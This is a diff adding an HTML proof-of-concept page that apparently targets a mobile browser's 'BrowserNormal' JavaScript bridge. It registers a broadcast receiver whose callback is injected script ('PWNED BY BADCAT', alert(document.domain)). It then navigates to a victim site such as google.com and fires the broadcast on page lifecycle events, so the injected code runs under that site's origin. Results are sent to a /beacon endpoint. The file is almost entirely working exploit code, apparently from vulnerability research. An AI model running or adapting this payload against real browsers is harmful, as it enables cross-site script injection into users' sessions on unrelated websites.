@@ -1,0 +1,46 @@
+<!doctype html>
+<meta charset="utf-8">
+<pre id="log"></pre>
+<script>
+(() => {
+  const q = new URLSearchParams(location.search);
+  const eventName = q.get('event') || 'pagehide';
+  const victim = q.get('victim') || 'https://www.google.com/';
+  const delay = Math.max(100, Number(q.get('delay') || 800));
+  const megabytes = Math.max(0, Math.min(32, Number(q.get('mb') || 0)));
+  const broadcast = `heytap-lifecycle-${eventName}-${Date.now()}`;
+  const log = value => {
+    document.querySelector('#log').textContent += `${value}\n`;
+    (new Image()).src = `/beacon?probe=broadcast-lifecycle&value=${encodeURIComponent(value)}&t=${Date.now()}`;
+  };
+
+  const callback = '((code,data)=>document.write("<h1>PWNED BY BADCAT</h1><script>alert(document.domain)</\script>"))';
+  const data = megabytes ? 'A'.repeat(megabytes * 1024 * 1024) : 'x';
+
+  try {
+    BrowserNormal.registerBroadcastReceiver(broadcast, callback);
+    log(`registered:${broadcast}:event=${eventName}:mb=${megabytes}`);
+  } catch (error) {
+    log(`register-error:${error}`);
+    return;
+  }
+
+  let sent = false;
+  const fire = () => {
+    if (sent) return;
+    sent = true;
+    try {
+      BrowserNormal.sendBroadcast(broadcast, 7, data);
+      log(`sent:${eventName}`);
+    } catch (error) {
+      log(`send-error:${eventName}:${error}`);
+    }
+  };
+
+  addEventListener(eventName, fire, {once: true});
+  setTimeout(() => {
+    log(`navigate:${victim}`);
+    location.replace(victim);
+  }, delay);
+})();
+</script>
